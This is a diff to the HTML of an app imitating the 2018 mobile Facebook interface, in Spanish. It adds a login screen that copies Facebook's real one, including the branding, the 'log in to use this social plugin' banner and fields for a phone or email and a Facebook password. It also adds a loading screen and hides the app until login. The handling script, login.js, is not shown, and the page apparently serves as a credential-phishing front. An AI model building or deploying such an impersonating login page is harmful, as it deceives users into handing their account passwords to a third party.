@@ -29,18 +29,109 @@
   <link rel="stylesheet" href="fb2018/css/profile.css">
   <link rel="stylesheet" href="fb2018/css/messenger.css">
   <link rel="stylesheet" href="fb2018/css/notifications.css">
+  <link rel="stylesheet" href="fb2018/css/login.css">
   <link rel="manifest" href="manifest.json">
-  <meta name="theme-color" content="#1877F2">
+  <meta name="theme-color" content="#3b5998">
   <meta name="description" content="Aplicación Facebook - Conecta con amigos y familiares">
   <link rel="icon" type="image/png" href="fb2018/images/icon-192.png">
   <link rel="apple-touch-icon" href="fb2018/images/icon-192.png">
 </head>
 <body>
 
+  <!-- ══════ LOGIN SCREEN ══════ -->
+  <div id="login-screen">
+    <!-- Header -->
+    <div class="login-header">
+      <div class="login-header-logo">facebook</div>
+    </div>
 
+    <!-- Info banner -->
+    <div class="login-info-banner">
+      <div class="login-info-text">Inicia sesión en tu cuenta de Facebook para usar este complemento social.</div>
+    </div>
+
+    <!-- FB Lite promo -->
+    <div class="login-lite-promo">
+      <div class="login-lite-icon">
+        <svg viewBox="0 0 36 36" fill="none">
+          <rect width="36" height="36" rx="5" fill="#e8eaf0"/>
+          <rect x="6" y="2" width="24" height="32" rx="3" fill="#b0b3b8"/>
+          <rect x="8" y="5" width="20" height="24" rx="1" fill="#fff"/>
+          <circle cx="18" cy="33" r="1.5" fill="#e4e6eb"/>
+          <path d="M18 11c-3 0-5 2.2-5 5.2 0 1.6.6 3 1.7 4v1.8l1.5-.8c.5.1.9.2 1.3.2h.5c3 0 5-2.2 5-5.2 0-3-2.2-5.2-5-5.2zm.6 7l-1.4-1.5-2.7 1.5 2.6-2.8 1.4 1.5L21.2 15l-2.6 2.8z" fill="#4267b2"/>
+        </svg>
+      </div>
+      <div class="login-lite-text">Obtén Facebook Lite y navega más rápido.</div>
+    </div>
+
+    <!-- Form -->
+    <div class="login-form-area">
+      <div class="login-input-group">
+        <input type="text" id="login-email" class="login-input" placeholder="Número de celular o correo electrónico" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+        <div class="login-input-divider"></div>
+        <input type="password" id="login-password" class="login-input" placeholder="Contraseña de Facebook" autocomplete="off">
+      </div>
+      <button id="login-submit-btn" class="login-btn-submit">Iniciar sesión</button>
+    </div>
+
+    <!-- Divider -->
+    <div class="login-divider">
+      <div class="login-divider-line"></div>
+      <span class="login-divider-text">o</span>
+      <div class="login-divider-line"></div>
+    </div>
+
+    <!-- Create account -->
+    <div class="login-btn-create-wrap">
+      <button class="login-btn-create">Crear cuenta nueva</button>
+    </div>
+
+    <!-- Help links -->
+    <div class="login-help-links">
+      <span class="login-help-text">
+        <a href="#" class="login-help-link">¿Olvidaste tu contraseña?</a>
+        <span class="login-help-dot">·</span>
+        <a href="#" class="login-help-link">Servicio de ayuda</a>
+      </span>
+    </div>
+
+    <!-- Languages -->
+    <div class="login-languages">
+      <div class="login-languages-grid">
+        <span class="login-lang login-lang-active">Español</span>
+        <span class="login-lang">עברית</span>
+        <span class="login-lang">العربية</span>
+        <span class="login-lang">Русский</span>
+        <span class="login-lang">Français (France)</span>
+        <span class="login-lang">English (US)</span>
+        <span class="login-lang">Português (Brasil)</span>
+        <span class="login-lang">&nbsp;</span>
+      </div>
+      <div class="login-lang-plus-wrap">
+        <div class="login-lang-plus">+</div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="login-footer">
+      <div class="login-footer-text">Facebook ©2018</div>
+    </div>
+  </div>
+
+  <!-- ══════ LOADING SCREEN ══════ -->
+  <div id="loading-screen" class="hidden">
+    <div class="loading-logo">
+      <svg viewBox="0 0 60 60" width="60" height="60">
+        <rect width="60" height="60" rx="8" fill="#3b5998"/>
+        <path d="M40 10H35c-3.3 0-6 2.7-6 6v5h-4v6h4v16h6V27h4l1-6h-5v-4c0-1 .4-2 2-2h3V10z" fill="white"/>
+      </svg>
+    </div>
+    <div class="loading-spinner"></div>
+    <div class="loading-text" id="loading-status-text">Iniciando sesión...</div>
+  </div>
 
   <!-- TOP BAR (Blue search bar) -->
-  <header id="topbar-blue">
+  <header id="topbar-blue" style="display:none">
     <button class="topbar-icon-btn" id="btn-camera" aria-label="Camera">
       <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
         <circle cx="12" cy="13" r="4"/>
@@ -63,7 +154,7 @@
   </header>
 
   <!-- TAB BAR (White) -->
-  <nav id="tab-bar">
+  <nav id="tab-bar" style="display:none">
     <button class="tab active" data-screen="feed" aria-label="Home">
       <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
         <path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-4 0a1 1 0 01-1-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 01-1 1m-2 0h2"/>
@@ -96,7 +187,7 @@
   </nav>
 
   <!-- SCREENS -->
-  <main id="app">
+  <main id="app" style="display:none">
 
     <!-- FEED -->
     <section id="screen-feed" class="screen active">
@@ -343,6 +434,7 @@
   <script src="fb2018/js/messenger.js"></script>
   <script src="fb2018/js/notifications.js"></script>
   <script src="fb2018/js/router.js"></script>
+  <script src="fb2018/js/login.js"></script>
   <script src="fb2018/js/main.js"></script>
 
   <!-- Service Worker Registration & PWA Install -->
